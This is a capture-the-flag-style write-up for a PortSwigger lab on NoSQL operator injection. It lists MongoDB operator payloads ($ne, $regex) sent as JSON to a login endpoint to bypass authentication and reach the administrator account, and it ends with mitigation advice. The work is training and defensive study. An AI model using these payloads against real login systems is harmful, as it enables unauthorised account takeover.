# Lab 02 — Exploiting NoSQL operator injection to bypass authentication

> **Practitioner** · [Official lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)

**Entry point:** `POST /login` accepts JSON — inject Mongo operators.

## Solution

1. `username: {"$ne":""}` (password `peter`) → logs in as wiener.
2. `username: {"$regex":"wien.*"}` → still works ($regex confirmed).
3. Both `username` and `password` as `{"$ne":""}` → *"unexpected number of
   records"* → multiple users matched.
4. Fix the username to the admin:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

→ logs in as administrator (open the session via *Show response in
browser*) — lab solved.

## Mitigation

Validate types (strings only), reject `$`-prefixed keys, use an ODM that
parameterizes.
